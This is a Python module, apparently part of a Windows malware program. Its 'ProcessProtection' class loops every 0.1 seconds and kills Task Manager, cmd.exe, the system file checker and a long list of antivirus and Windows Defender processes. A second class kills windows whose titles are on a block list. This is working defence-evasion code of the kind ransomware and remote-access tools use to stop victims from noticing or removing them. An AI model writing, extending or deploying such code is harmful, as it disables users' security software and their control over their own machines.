import os
import time
import subprocess
import signal
import psutil
import threading
from .util import GetActiveWindow as  GetCurrentWindowTitle
from .util import kill_process_from_window_name
from .util import GetActiveWindows as list_windows
from .util import list_proc_pids_from_name
from .util import kill_procs_from_pids
from .msgbox import *
from .localization import strings
string = strings()
execute = os.system
class ProcessProtection:
    def __init__(self):
        self.black_list_process = [
            'taskmgr.exe', 
            'ashserv.exe', 
            'avgemc.exe', 
            'epprotectedservice.exe', 
            'epsecurityservice.exe', 
            'epupdateservice.exe', 
            'epupdateserver.exe', 
            'sfc.exe', 
            'cavwp.exe', 
            'cfp.exe', 
            'cylancesvc.exe', 
            'eraagent.exe', 
            'fsav32.exe', 
            'fsdfwd.exe', 
            'fsguiexe.exe', 
            'klnagent.exe', 
            'mbam.exe', 
            'mbar.exe', 
            'mbae.exe', 
            'mcuicnt.exe', 
            'mfemms.exe', 
            'mfevtps.exe', 
            'mcshield.exe', 
            'mfeesp.exe', 
            'mfetps.exe', 
            'mfetrs.exe', 
            'mfetp.exe', 
            'mcods.exe', 
            'mpfservice.exe', 
            'mpfagent.exe', 
            'mcshell.exe', 
            'mssclli.exe', 
            'avengine.exe', 
            'pcmaticpushcontroller.exe', 
            'pcmaticrt.exe', 
            'sepwscsvc64.exe', 
            'ntrtscan.exe', 
            'tmntsrv.exe', 
            'pccpfw.exe', 
            'wrsa.exe', 
            'mpcmdrun.exe', 
            'msascuil.exe',
            'taskmgr.exe',
            "cmd.exe"
        ] # şimdilik powershell silindi sonra yine ekle alperen
        self.terminator = os.kill
    def progressor(self):
        while 1:
            for process in psutil.process_iter():
                process_name = process.name().lower()
                process_id = process.pid
                if process_name in self.black_list_process:
                    try:
                        os.kill(process_id,signal.SIGTERM)
                    except OSError:
                        pass
            time.sleep(0.1)
    def start(self):
        thread = threading.Thread(target=self.progressor)
        thread.daemon = False
        thread.start()
class WindowProtection:
    def __init__(self):
        self.blacklisted_titles = string.string_user_opened_not_allowed_wintitles
        self._call_back_func = None
    @property
    def callback_func(self):
        return self._call_back_func
    @callback_func.setter
    def callback_func(self,func_name):
        if func_name.__class__.__name__ in ("method","function"): #only allowed methods and functions
            self._call_back_func = func_name
    def _handler(self):
        print("I am working god dammit")
        while True:
            for black_listed_window_ in self.blacklisted_titles:
                window_title = GetCurrentWindowTitle()
                if black_listed_window_ in window_title.lower():
                    if self.callback_func is not None:
                        try:
                            self.callback_func()
                        except:
                            pass #ignore exceptions and continue
                    kill_process_from_window_name(window_title)
            time.sleep(0.1)

    def start(self):
        thread = threading.Thread(target=self._handler,daemon=False)
        thread.start()